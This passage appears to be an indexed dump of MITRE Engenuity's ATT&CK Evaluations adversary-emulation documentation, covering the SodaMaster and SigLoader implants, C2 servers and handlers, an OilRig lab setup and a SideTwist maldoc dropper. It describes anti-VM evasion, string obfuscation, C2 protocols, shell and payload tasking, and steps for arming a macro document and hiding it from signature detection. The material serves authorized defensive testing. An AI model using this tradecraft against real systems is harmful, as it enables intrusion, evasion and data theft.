Privilege Level /s Remote Server Name /ru User","schtasks /delete /tn Name of Task /f","schtasks /delete /tn Name of Task /s Remote Server Name /f","schtasks /delete /tn Notepad++ Script /f","System"]},{"l":"Cleanup","p":["A cleanup script had been provided in the cleanup folder. The script will close Notepad++ and delete any files that are needed to run SigLoader. Additionally it will check for and deelete SigLoaders debug file. Finally it checks for and deletes any service or scheduled task created to run SigLoader.","Runing the file:","Open Powershell in Administrative mode","Run the cleanup script","./cleanup.ps1"]},{"l":"References","p":["https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20Ecipekac%20Layer%20I,it%E2%80%99s%20divisible%20by%20eight","https://github.com/med0x2e/SigFlip","https://github.com/monoxgas/sRDI","https://github.com/magnusstubman/dll-exports/tree/main"]}],[{"l":"SodaMaster"},{"l":"SodaMaster DLL","p":["SodaMaster Diagram"]},{"l":"Description"},{"l":"Automated System Discovery","p":["Upon execution of SodaMaster, there are several pieces of information collected and analyzed in the target environment. This information is used to determine if the payload is running in a virtualized/sandboxed environment as well as to relay situational awareness information back to the C2 server.","Information collected and sent back to the C2 server are as follows:","The username/owner of the SodaMaster process","The hostname/computername of the system with the implant installed","The process ID of the SodaMaster process and the process privilege flag","Processor architecture and Windows build information","The date/time that the implant was initially executed","An RC4 key that will be used to encrypt the followup communications","The name of the socket used to connect to the C2 server"]},{"i":"shellcode-reflective-dll-injection-srdi","l":"Shellcode Reflective DLL Injection (sRDI)","p":["The sRDI payload should be compiled as a DLL with an export function.","Use the following steps to prepare the payload and generate shellcode for use with the SodaMaster sRDI module:","Clone the sRDI repo, Note that you must checkout the sRDI repo to commit 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a or it will not function.","Open Powershell and navigate to the sRDI/Powershell directory of the sRDI repo (double check that you're checked out to the correct commit).","Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).","Import the conversion module: Import-Module .\\ConvertTo-Shellcode.ps1","Perform the conversion:"]},{"i":"anti-vmanti-sandbox","l":"Anti-VM/Anti-Sandbox","p":["Sodamaster implements several anti-vm/anti-sandbox techniques. These techniques determine if the implant is in a virtual environemnt and/or being manipulated in an unitended way and exits the application.","The following high level techniques have been implemented into SodaMaster:","Time based evasion","The implant track the time between cycles and determines if the application/system time is being manipulated.","Registry Checks","Applications\\\\VMwareHostOpen.exe","Running Process Checks","vmtoolsd.exe","vbox.exe","Checks that the number of processors are greater than 1.","Sits in a loop until the active window state changes (to show user activity)"]},{"l":"StackStrings","p":["Strings can be easily discovered inside a binary. The idea of stack strings is to add a layer of obfuscation to the string that makes it more dificult to read and reverse. The script stackstrings.py is an automated tool that can be used to convert normal stirngs into stack strings."]},{"i":"the-math-function","l":"the \"math\" function","p":["To use the stackstring function you will need to write a function that performs some operations with two integer variables. These opterations will help to obfuscate the fact that the provided variables add up to a decimal value."]},{"i":"note-the-script-adds-5-to-int-val1-so-a-custom-function-should-account-for-that","l":"NOTE: The script adds 5 to int val1, so a custom function should account for that","p":["Math Function:","The script takes the three following required arguments:","function_name - The \"math\" function.","variable_name - a variable name that will hold the obfuscated string","string - The string you want to obfuscate","Usage:","Example:"]},{"l":"C2 Communications"},{"l":"Packet Format","p":["Packets are created by prepending data with an associated ID and length byte. The start of the unencrypted packet data will contain an identifier. The identifier will allow the C2 server to differentiate from random connections and an actual implant connection. The following example shows how a packet send to the C2 server would format sending the username and computer name to the C2 server."]},{"l":"Data Field Formats"},{"l":"Unencrypted Example"},{"l":"Encrypted Example"},{"i":"implant-packet-dataid-table-implant---c2","l":"Implant Packet Data/ID Table (Implant -> C2)","p":["0x03","0x04","0x05","0x06","0x07","0x08","0x09","0x40","4 Byte","Computer Name","Data","Date of execution (yyyy/mm/dd hh:mm:ss)","ID","Length","PID","Privilege Flag","Processor Arch (1 byte), OS Major version (1 byte), OS Build version (4 bytes), Product Type (3 bytes)","RC4 encryption key for C2 communications","Socket name","The following table shows the ID's and correlated data in the first packet send to the C2 server.","User Name","Varaible","Variable"]},{"i":"implant-packet-dataid-table-contd-implant---c2","l":"Implant Packet Data/ID Table Contd. (Implant -> C2)","p":["Additional Data/ID's to be used for general C2 communication","ID","Length","Data","0x98","NULL","C2 beacon","0x99","Variable","Response to C2 (stdout, ack, etc.)"]},{"i":"c2-packet-dataid-table-c2---implant","l":"C2 Packet Data/ID Table (C2 -> Implant)","p":["0","Arguments","Beacon timer","Command","Description","Example:","Exit's the implant process","f","l","Length","Message box title, Message box text","NULL","Pops up a message box on the implant host","RC4 key","s","Send shellcode from the C2 server and inject into a process","Set the RC4 key to be used during communication","Set the time inbetween implant check-in's (1-255 seconds)","Shellcode","The C2 server will acknowledge packets by sending a 0x98. If the C2 doesnt acknowledge then the data should be resent.","THe following table shows the Packet command table and expected data/arguments. Arguments are separated using a semicolon ;.","Variable","w","x"]},{"i":"expected-data-format-examples-c2---implant","l":"Expected Data Format Examples (C2 -> Implant)","p":["Tasking the implant to sleep for 15 seconds.","Tasking the implant to open a message box that says \"test\""]},{"l":"Encryption"},{"i":"stackstrings-1","l":"StackStrings","p":["All strings that are used in the implant are either encoded using the StackString technique or runtime Xor Encryption/Decrption."]},{"l":"XOR String Encryption","p":["The XOR encryption is done using macros at compile time, and is decrypted at runtime. The code snippit was found on Stack overflow at: https://stackoverflow.com/questions/7270473/compile-time-string-encryption"]},{"l":"RSA Encryption","p":["The first packet sent by the SodaMaster implant is encrypted with an RSA 2048-bit key. The key was generated using the following commands:","Note: The DER format public key is bae64 encoded before being put in the RSA function"]},{"l":"RC4 Encryption","p":["Follwing the first packet all traffic between c2/impant is encrypted using RC4. The key is randomly generated and sent to the C2 server in the first RSA encrypted packet."]},{"l":"Anti-VM Checks","p":["Currently SodaMaster implements 5 anti-vm/anti-sandbox checks. The checks are listed out in more detail below.","Registry Checks","Applications\\\\VMwareHostOpen.exe","Process Checks","vbox.exe","vmtoolsd.exe","Check CPU cores > 1","Check that time isnt being sped up on every logical loop.","Validate MSR reserved MSR ranges"]},{"l":"Building the DLL","p":["Open Powershell and move to the project source directory. From the project source directory run the following command to build the DLL.","Build with default arguemnts:","Build with custom arguments:"]},{"l":"Testing","p":["The SodaMaster integration test can be used to make sure that SodaMaster is executing properly in a given environemnt. Currently the integration test will check the following:","TCP connection to C2","Beacon packet sent to C2","SodaMaster path added to Windows Defender whitelist","To use the integration test, the implant should be compiled with 127.0.0.1 as the C2 IP Address and 9999 as the C2 Port.","Run the integration test:","Then run the implant.","The integration test window will provide prompts based on the results of the integration test."]},{"l":"Cleanup Instructions","p":["Use the cleanup.ps1 script to remove all SodaMaster artifacts from disk. The script can be found here: cleanup.ps1"]},{"l":"CTI Links","p":["Secure List","JPCERT","Kaspersky","TrendMicro","Symantec"]},{"l":"Dependencies"},{"i":"configuring-vcpkg--cryptopp","l":"Configuring VCPKG + CryptoPP","p":["Install vcpkg with these commands:","cd C:\\","git clone https://github.com/Microsoft/vcpkg.git","cd vcpkg","./bootstrap-vcpkg.sh","./vcpkg integrate install","Set a system level environment variable named VCKPG_ROOT to the root of your installation directory. For example, VCPKG_ROOT = C:\\vcpkg.","The projects dependencies (cryptopp) will now automatically be installed at build time."]},{"l":"Troubleshooting"},{"l":"Anti-VM Exits","p":["In most cases the AntiVM functions are wrapped in try/except statements allowing SodaMaster to continue execution if EDR or some other application interferes with the AntiVM function. There are logs associated wih the AntiVM functions that will let the operator know if a specific function failed or succeeded.","The MSRCheck is the only AntiVM check that isn't surrounded with try/except since it depends on an error being thrown as part of the check. The logging for this function is outside of the function. There will be a statement before the function that logs the function start, if there is a following log it can be considered sucessful, if there isn't it should be treated as AntiVM triggered."]},{"l":"Visual Studio","p":["To execute the unit tests, thre are two options. The first option it to select Build Build All and execute the unit_tests.exe binary. The second option is to select Test Run CTests for SodaMaster. Both options will execute all existing unit tests.","Current unit tests:","RC4 Encryption","RC4 Decryption"]},{"l":"Check that debug strings are encrypted in the binary"},{"i":"start-a-listener-on-the-local-system-for-tcpcomms-testing","l":"Start a listener on the local system for TCP/Comms testing","p":["Open a powershell prompt and browse to the scripts/ directory.","Import the poershell function using:","Start the listner in PowerShell:","You can exit the listener at any time using CTRL + C."]}],[{"l":"OilRig","p":["License","Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from OilRig in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83D\uDEE2ï¸","p":["Objectives: OilRig is a cyber threat actor with operations aligning to the strategic objectives of the Iranian government. 1 2 OilRig has been operational since at least 2014 and has a history of widespread impact, with operations directed against financial, government, energy, chemical, telecommunications and other sectors around the globe. 3 OilRig commonly leverages spearphishing and social engineering tactics in their operations, as well as PowerShell backdoors. 4 5 6 The group continues to evolve its tradecraft to evade detection, and utilizes a combination of proprietary malware, customized versions of publicly available tools, and off-the-shelf, multi-purpose software.","Associated Groups: COBALT GYPSY, IRN2, APT34, Helix Kitten"]},{"i":"emulation-overview","l":"Emulation Overview \uD83D\uDCD6","p":["This scenario follows OilRigâs multi-phase approach to exfiltrating sensitive data from a targeted server. OilRig leverages spearphishing to gain initial access onto an administratorâs workstation and deploys their SideTwist malware. Once persistence is established on the victim network, the attackers will escalate privileges and move laterally onto an EWS server. Further enumeration of the EWS server will lead to OilRigâs identification of a SQL server storing confidential critical infrastructure data. Characteristics of this campaign include: custom webshells, Windows and Microsoft 365 exploitation, and key attacker objective on obtaining control of the SQL server to steal victim files.","Operations Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1â\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary. A build script has been provided for building all binaries on a Kali Linux host.","This scenario also utilizes Mimikatz, Plink and PsExec as payloads:","Mimikatz","Plink","PsExec.exe"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"l":"Emulation Key Software","p":["SideTwist- SideTwist is a C-based backdoor that has been used by OilRig since at least 2021 and is purposed for downloading, uploading, command execution, and persistence.","TwoFace- TwoFace is a webshell written in C# used by OilRig for lateral movement since at least 2017.","VALUEVAULT- VALUEVAULT is a Golang version of the Windows Vault Password Dumper credential theft tool developed by Massimiliano Montoro and has been used by OilRig since at least 2019.","RDAT- RDAT is a backdoor used by OilRig for data collection and exfiltration since at least 2017."]},{"l":"Scenario Walkthrough","p":["Emulation Scenario- Step by step walkthrough of scenario's procedures."]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Operation Flow- High-level summary of the scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2022 MITRE Engenuity. Approved for Public Release. Document number AT0037.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Documentation for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["Binaries","caldera_port","cleanup","README","control_server","Mimikatz","payloads","RDAT","Infrastructure Setup","SideTwist","SideTwist_Dropper","TwoFace","utilities","VALUEVAULT"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. The SideTwist handler in particular expects its payloads to be in a separate SideTwist directory under the payloads directory (e.g. Resources/payloads/SideTwist)"]},{"l":"Build from source"},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the config/handler_config.yml file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Alternatively run direct from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the config/handler_config.yml file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"i":"attck-evaluations-emotet-handler","l":"ATT&CK Evaluations Emotet Handler","p":["The ATT&CK Evaluations Emotet Handler is used to handle communications between the Emotet Client and control server via a REST API.","The Emotet Handler provides features to communicate with the Emotet Client and forwarding control information to the Control Server.","The Emotet Handler must be run as root because it needs to bind to standard port 80. Optionally, you can start it with a different port and IP address by giving it command line params."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Example usage","p":["View functions from emotet_test.go for an example on how to interact with the control server"]}],[{"i":"attck-evaluations-exaramel-for-linux-handler","l":"ATT&CK Evaluations Exaramel for Linux Handler","p":["The ATT&CK Evaluations Exaramel for Linux handler is used to handle communications between the ATT&CK Evaluations Exaramel for Linux client and the Control Server via a REST API.","This handler uses Task IDs to maintain state regarding the tasks that are sent to the client and the responses that are returned. It serves only HTTPS communications.","This handler must be run as root as it is intended to bind to port 443."]},{"l":"Usage","p":["This handler is automatically loaded by the control server when the control server is started."]},{"l":"Tasking Commands","p":["Task commands to the Exaramel for Linux client using evalsC2Client.py:","Note: The ATT&CK Evaluations version of Exaramel for Linux uses a static GUID of: exaramel-implant.","Commands that can be provided to the implant:"]},{"l":"Run Tests","p":["Install Go version 1.15 or higher.","Enter the control server directory, and run Exaramel for Linux tests. Go will automatically fetch dependencies."]},{"l":"Install Dependencies","p":["Dependencies will be automatically installed by Go when running the tests.","The go.mod file contains detailed information on the dependencies."]}],[{"i":"attck-evaluations-trickbot-handler","l":"ATT&CK Evaluations TrickBot Handler","p":["The ATT&CK Evaluations TrickBot Handler is used to handle communications between the Trickbot Client and control server via a REST API.","The TrickBot Handler provides features to communicate with the Trickbot Client and forwarding control information to the Control Server.","The Trickbot Handler must be run as root because it needs to bind to a standard port."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Registration Example","p":["On server:","On client or another server shell:"]},{"l":"Get Task Example","p":["On client or another server shell:"]},{"l":"Post Task Output Example","p":["On client or another server shell:"]}],[{"l":"SideTwist handler","p":["The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending commands embedded in HTML and receiving the associated output."]},{"l":"Components","p":["The handler consists of a web server that listens on a specified address/port and serves the following URL endpoints:","GET /search/{guid}, where {guid} represents the unique ID of an implant session to register and receive tasks. E.g. the first GET request for /search/1234 will create a new implant session with ID 1234, and subsequent GET requests will simply return tasks.","POST /search/{guid} is used to submit results (task output or file uploads) for the implant with the specified ID.","GET /getFile/{filename} is used to fetch payloads of the name {filename}. Available payloads are listed in the files directory within the main C2 server repo.","GET /logo.png serves the lookalike website logo. This will typically be requested only when using a browser to view the lookalike site."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the SideTwist handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the SideTwist entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the SideTwist handler."]},{"l":"Tasking Implants","p":["To register or receive tasking for an implant session, the SideTwist handler expects a GET request for /search/{guid}. If this is the first time that the SideTwist handler recognizes the implant with id {guid}, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent GET requests to the same endpoint.","For example:","As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the evalsC2client.py script. The SideTwist handler will allow operators to task the following command types:","101 command arg1 arg2...- the command ID 101 will have the implant execute a shell command with the provided args. Note that a command is required for ID 101.","102 saveAsName|payloadName- the command ID 102 will have the implant request a payload specified by payloadName and save it as saveAsName.","WARNING: the handler does not validate the command structure or payload names/paths, so operators must ensure that the correct names and paths are used, the | character is correctly placed, etc.","103 fileToUpload- the command ID 103 will have the implant upload the specified local file to the C2 server.","104 command arg1 arg2...- the command ID 104 is an alias for command ID 101. Note that a command is required for ID 104.","105- instructs the implant to terminate. Used when the implant is in loop mode.","Examples of valid tasking:","Examples of invalid tasking:","When the implant beacons in with the GET /search/{guid} requests, the returned HTTP response contains an HTML page with an embedded task string that has been encrypted and base64-encoded. The embedded string is placed within script HTML tags, e.g.:","Encryption and decryption are performed by XOR'ing the plaintext/ciphertext with the hardcoded key notmersenne. The underlying plaintext data is the task string that gets processed by the implant and is of the form commandNumber|commandID|base64(command to execute). For instance, the first task assigned to the implant may look something like 1|101|d2hvYW1pLmV4ZSAvYWxs(base64 encoding of whoami.exe /all), and the second task may look something like 2|102|YzpcdXNlcnNccHVibGljXHBheWxvYWQuZXhlfHBheWxvYWQuZXhl(base64 encoding of c:\\users\\public\\payload.exe|payload.exe). Note that if an implant beacons in, but there is no pending task for the session, the empty task string -1|| is returned."]},{"l":"Payloads","p":["Like tasking, requested payloads are XOR-encrypted and base64-encoded before being returned. However, the payload data is not embedded in an HTML page. Instead, the raw encrypted/encoded file data is returned.","SideTwist-specific payloads must be stored within the payloads/SideTwist directory within the parent directory of the control server. For instance, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/SideTwist/ in order for the SideTwist handler to successfully serve them."]},{"l":"File Uploads and Task Output","p":["When implants send task output or file uploads to the SideTwist C2 handler, they must do so by sending an HTTP POST request to /search/{guid} with their corresponding guid value. The server will not accept task output or file uploads from an implant if no task was assigned to the implant or if the specified task does not expect output (e.g. tasking the implant to terminate itself). The POST data must be a JSON dictionary with one key-value pair - the key is a string representation of the corresponding command number, and the value is a string containing the base64 encoding of the XOR-encrypted output or uploaded file data.","Example (implant abcd submits output thisismyoutput for command number 5):","Upon success, a successful HTTP response code is sent back with an empty response body.","For regular task output, the SideTwist handler will forward the decoded and decrypted output to the REST server. File uploads will be decoded and decrypted before being written to the server's file system.","Note that the file uploads themselves do not contain the file name to save as - this is determined by the handler when tasking the implant with command ID 104. For instance, if the implant is tasked with 104 C:\\path\\to\\file.txt, then the received file upload data will be saved as file.txt within the C2 server's files directory."]},{"l":"Bootstrap Tasking","p":["Since the SideTwist implant beacons back infrequently, the first beacon can be \"wasted\" since all it does is register a session without returning a command. If operators choose to do so, they can register \"bootstrap\" tasks, which will be the first task sent to any new session registered with the sidetwist handler. Note that only one bootstrap task can be registered for the SideTwist handler, and the task will only be sent on the implant's first beacon when registering a session. Subsequent beacons from the same implant will not return this task.","To set a bootstrap task, use the evalsC2client.py script accordingly:","In the example above, all new sidetwist sessions will be tasked with 101 whoami.exe/all. Note that the task syntax must be the same as in regular tasking via --set-task. Subsequent calls to --set-bootstrap-task will overwrite the currently set task.","To view or clear the currently set bootstrap task, run the following:"]},{"l":"Error Messages","p":["In order to maintain some level of secrecy and OpSec, the handler will not return specific error messages in response to HTTP requests. Any specific error messages will be logged to the console and log file on the C2 server itself. The implant and HTTP requests will simply receive a generic error message of Internal server error with HTTP error code 500."]}],[{"l":"OilRig Setup Procedure"},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: Kali Linux 2019.2","Mail and Apache Server: Kali Linux 2019.2"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Mail and Apache Server","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model malware previously used by OilRig.","These utilities include credential dumpers, implants, and file exfiltration.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","Implants are configured to connect back to static IP address 192.168.0.4. Build instructions for each payload can be found with source code in their respective directories."]},{"i":"linux-attack-platform-setup--19216804","l":"Linux Attack Platform Setup \\ 192.168.0.4","p":["Download the OilRig ATTACK Evaluations Library to the /opt/ directory","Use the Linux commands below to populate the binaries in the expected directories for the scenario:","Download Mimikatz to the Resources/payloads/TwoFace/ directory. Rename Mimikatz executable as m64.exe.","Download Plink to the Resources/payloads/SideTwist/ directory","Download PsExec.exe to the Resources/payloads/TwoFace/ directory","Install FreeRDP"]},{"i":"mail-and-file-server-setup--19216805","l":"Mail and File Server Setup \\ 192.168.0.5","p":["Install Apache","Install Postfix","Stage the SideTwist dropper Marketing_Materials.zip to /var/www/html","Run the install-configure-postfix.sh bash script as sudo","Run the setup-apache-fileserver.sh bash script as sudo","Note: You may need to chmod the scripts to allow them to run."]},{"l":"Target Infrastructure","p":["4 targets, all domain joined to the boombox domain:","SQL Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","Exchange Server: tested and executed on Windows Server 2k19 - Build 17763","Exchange Admin Workstation: tested and executed on Windows 10 - Build 17763"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","SQL Server","endofroad","10.1.0.7","Domain Controller","diskjockey","10.1.0.4","Exchange Server","waterfalls","10.1.0.6","Exchange Admin Workstation","theblock","10.1.0.5"]},{"i":"configure-domain-controller-diskjockey-10104","l":"Configure Domain Controller diskjockey\\ 10.1.0.4","p":["Create the user accounts as used in the scenario:","Domain Admins","Domain Users","EWS Admins, Domain Users","EWS Admins, SQL Admins, Domain Users","gosta","groups","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","mariam","Note: in the scenario, DNS records were manually created to emulate network activity from suspect domains","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","Open Windows Defender, toggle all nobs to the off position.","shiroyeh","shiroyeh_admin","tous","username"]},{"i":"configure-workstation-theblock-10105","l":"Configure Workstation theblock\\ 10.1.0.5","p":["Ensure Microsoft Office is installed and that you're able to edit a document. This will ensure the macros run correctly against the host.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-ews-server-waterfalls-10106","l":"Configure EWS Server waterfalls\\ 10.1.0.6","p":["Setup Exchange Server to host OWA and EAC.","Create the \"EWS Admins\" group, adding tous, gosta","Install MSSQL","Create a scheduled task to run the sql_connection.bat upon system startup:","Reboot the machine and verify connection in PowerShell:","Open Windows Defender, toggle all nobs to the off position.","In the same PowerShell window, run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-sql-server-endofroad-10107","l":"Configure SQL Server endofroad\\ 10.1.0.7","p":["Install MSSQL and configure data to be stored locally on the C: drive.","Create an \"SQL Admins\" domain group with tous as a member, additionally giving tous access permissions and ownership of the DB.","Sign in as tous and create a new database called sitedata.","Import the minfac.csv data file to populate the database.","Create a backup of the database to the drive for later exfiltration by the adversary","Note: For the purpose of execution, this directory was C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","Open port 1433 in Windows Defender Firewall","Add the \"SQL Admins\" group to Local Administrators"]}],[{"l":"Implant Build Script","p":["The provided script will automatically build SideTwist, VALUEVAULT and RDAT from a Kali Linux host. The script utilizes MingW to compile SideTwist, golang to compile VALUEVAULT, and dotnet to compile RDAT.","NOTE: RDAT requires an additional DLL to be downloaded and placed in the/Resources/RDAT directory prior to compilation. Review RDAT's documentation for instructions on retrieving this DLL.","The script should be run from the current build_implants directory.","For installing MingW:","For installing golang:","For installing dotnet:"]}],[{"l":"SideTwist Dropper","p":["Included document \"GGMS Overview.doc\" is SAFE."]},{"l":"How It Works","p":["The target downloads the malicious office document, enables macros, and closes the document. In that span of time, the document performs the following:","The Document_Open() subroutine occurs where the macro","Collects the computername and username environment variables","Performs a sandbox detection check using Application.MouseAvailable","If this fails, a popup saying \"Microsoft Visual C++ Redistributable Error: 0x801.\" This is a dummy error to inform the oeprator that something went wrong.","Creates a directory named SystemFailureReporter under the current user's AppData\\Local directory and drops the SideTwist payload (named b.doc) and update.xml into this directory.","Note: The SideTwist payload is embedded within the document under UserForm1.TextBox1.Text as base64-encoded data. Information on how to replace this payload with your own is covered in the \"Weaponization\" section.","The Document_Close() subroutine occurs when the user closes the document, where it","Performs another sandbox detection check using Application.MouseAvailable","If this fails, another dummy error pops up saying \"Microsoft Visual C++ Redistributable Error: 0x802.\"","Renames b.doc from Step 4 to SystemFailureReporter.exe","Creates the SystemFailureReporter schtask, which is set to execute every 5 minutes forever.","Note: OilRig has been known to perform DNS-based infection updates during initial access [1]. This functionality was omitted from our emulated payload due to time and resource restrictions."]},{"l":"Operator Notes","p":["The SystemFailureReporter schtask and EXE are created when the document is closed. If you're not seeing the artifacts or callbacks you expect from the maldoc, close it first and wait 5 minutes for the first scheduled execution to occur.","When opening the maldoc, you may notice an unusually long time before you see the actual contents of the document. This is okay, as the maldoc is decoding and writing the SideTwist payload to disk.","If you're searching for artifacts under the current user's AppData\\Local directory from CMD or PowerShell, be mindful of differences in how environment variables are called between CMD and PowerShell:","CMD: dir %LOCALAPPDATA%","PowerShell: ls $env:LocalAppData","If you encounter \"file/directory not found\" errors while opening or closing the maldoc, check first to see if any artifacts already exist on the target (i.e. the AppData\\Local\\SystemFailureReporter directory and the \"SystemFailureReporter\" schtask). It's plausible that the document was already detonated on that host."]},{"l":"Weaponization","p":["Add it to a compressed archive, ensuring it's password-protected to avoid detection from static signatures. This emulation plan leverages a password-protected ZIP archive, but you can choose whatever format best meets your emulation requirements.","Creating a macro","From the \"Microsoft Visual Basic for Applications\" IDE, select \"Insert > UserForm\". Within the new Toolbox window, select \"TextBox\" and draw an arbitrarily-sized box inside UserForm1.","From the \"Project\" panel, double-click on the \"ThisDocument\" object under the\"Microsoft Word Objects\" folder. Copy and paste the entirety of the payload.vbs into this new window.","Note: the frequency here is specified in minutes.","On Linux: base64 path/to/payload.exe","On WIndows (PowerShell): .\\encode-file.ps1 -payload .\\path\\to\\payload.exe","Open the .doc file you want to infect and go to \"View > Macros\". Give the macro an arbitrary name (we won't be using it), select `[Name of .doc](document) from the dropdown menu, and hit \"Create\".","Populating the Text field","Save and close the document. Your document is armed and ready for prime-time!","The malicious VBA payload can be configured to use a custom schtask payload and schtask execution frequency.","To arm a document with an EXE of your choosing:","To modify the frequency of the schtask: Go to the Document_Close() subroutine and modify the integer value within the SchTask call to one of your choosing.","Under the \"Properties\" panel, select \"TextBox1 TextBox\" from the dropdown menu and find the \"Text\" property. Base64-encode your desired payload and paste the encoded payload within this property value. Newline characters and spaces will break the payload - Make sure neither are present before proceeding to the next step.","Upload the encrypted archive to a web server you control.","UserForm and TextBox Creation"]},{"l":"Testing and Pre-Flight Checks","p":["Start the control server on 192.168.0.4, ensuring the SideTwist profile under config/handler_config.yml is set to \"Enabled\".","sudo ./controlServer","Log in to a range Windows 10 machine and ensure Defender real-time protection is 